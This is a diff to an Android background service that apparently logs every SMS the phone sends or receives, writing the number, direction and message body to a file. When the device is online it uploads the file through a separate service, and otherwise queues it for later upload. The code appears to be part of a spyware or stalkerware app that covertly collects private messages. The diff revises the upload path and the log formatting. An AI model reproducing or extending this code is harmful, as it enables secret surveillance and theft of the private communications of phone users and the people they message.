@@ -135,17 +135,18 @@ public class BackService extends Service {
 								status = "incoming";
 							} else if (cur.getString(cur.getColumnIndex("type")).equals("2")) {
 								Log.e(LOG_TAG, "Sms Sent");
-								status = "outGoing";
+								status = "OutGoing";
 							} else {
 								return;
 							}
-							writer.append("_Number : "+no+"Statue :" + status+"body : "+content);
+							writer.append("Number : "+no+" \n Status :" + status+"\n body : "+content);
 							writer.flush();
 							writer.close();
 //							String path = RecordService.DEFAULT_STORAGE_LOCATION;
 							if (helpers.isOnline()) {
-                                helpers.requestFiletUpload(file.getAbsolutePath());
-                                new Thread(helpers).start();
+								Intent intent = new Intent(getApplicationContext(), Util.class);
+								intent.putExtra("currentFile", RecordService.DEFAULT_STORAGE_LOCATION + fileName);
+								startService(intent);
                             } else {
                                 dbHandler.createNewFileNameForUpload("filename", file.getAbsolutePath());
                             }
